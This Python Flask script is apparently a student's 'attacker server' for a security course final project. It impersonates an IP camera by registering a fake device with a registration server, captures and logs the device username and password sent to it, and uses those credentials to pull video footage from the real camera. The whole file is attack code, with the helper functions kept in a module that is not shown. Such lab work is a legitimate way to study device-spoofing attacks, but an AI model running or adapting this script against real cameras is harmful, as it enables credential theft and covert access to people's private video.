from typing import Literal
from flask import Flask, request
import logging
import argparse
from multiprocessing import Process
import time 
import os
import attacker_helper

app:Flask = Flask(__name__)
app.config['TEMPLATES_AUTO_RELOAD'] = True
app.config['DEBUG'] = False

global camera_ip_address
global camera_port

device_registered = False
device_uuid = None
device_username = None
device_password = None

@app.route("/")
def index_endpoint()-> str:
    return "ATTACKER SERVER! (CYSE 580 Final Project)"

@app.route("/register-credentials", methods=['POST'])
def register_credentials() -> Literal['SUCCESS', 'FAILURE']:
    
    global device_registered
    global device_uuid
    global device_username
    global device_password
    
    json_data:dict[str, str] = request.get_json()
    print(json_data)
    if device_registered == False:
        device_registered    = True
        device_uuid     = json_data['uuid']
        device_username = json_data['device_username']
        device_password = json_data['device_password']
        logging.info("DEVICE UUID/CREDENTIALS REGISTERED (%s)" % (device_uuid))
        logging.debug("uuid: %s, user: %s, pass: %s" % (device_uuid, device_username, device_password))
    else:
        logging.info("DEVICE ALREADY REGISTERED (%s)" % (device_uuid))
        logging.debug("uuid: %s, user: %s, pass: %s" % (device_uuid, device_username, device_password))
        
    return "SUCCESS"

    
@app.route("/video-footage", methods=['POST'])
def footage() -> str:
    json_data:dict[str, str] = request.get_json()
    json_uuid     = json_data['uuid']
    json_username = json_data['device_username']
    json_password = json_data['device_password']
    print(json_data)
    video_data = attacker_helper.request_video_footage(uuid=json_uuid, 
                                                                            device_ip_address=camera_ip_address, 
                                                                            device_port=camera_port, 
                                                                            device_username=json_username, 
                                                                            device_password=json_password)    
    print(video_data)
    return video_data

def start_flask(attacker_url,
                attacker_port):
    app.run(host=attacker_url, port=attacker_port)
    

# Main function
if __name__ == "__main__":    
    logging.basicConfig(level=logging.INFO)
    
    parser = argparse.ArgumentParser()
    parser.add_argument("-c", "--config_file",  help="Target domain for scraping", type=str, dest="config_file", default="attacker_config.yml")
    args = parser.parse_args()

    if args.config_file is None or args.config_file == "":
        print("Configuration file must be provided")
        print("EXITING")
        exit(-1)
        
    yaml_config = attacker_helper.load_yaml_config(args)
    
    camera_ip_address = yaml_config["camera_url"]
    camera_port       = yaml_config["camera_port"]
    
    p = Process(target=start_flask, args=(yaml_config["attacker_url"], yaml_config["attacker_port"]))
    p.start()
    
    logging.info("STARTING ATTACK")
    time.sleep(1)
    logging.info("ATTEMPTING TO SPOOF CAMERA DEVICE (%s)" % yaml_config["uuid"])
    
    if attacker_helper.register_fake_device(reg_url=yaml_config["registration_server_url"],
                                            reg_port=yaml_config["registration_server_port"],
                                            attacker_url=yaml_config["attacker_url"],
                                            attacker_port=yaml_config["attacker_port"],
                                            uuid=yaml_config["uuid"]) == False:
        p.kill()
        logging.error("NO REGISTRATION SERVER")
        exit(-1)
        
    
    
    
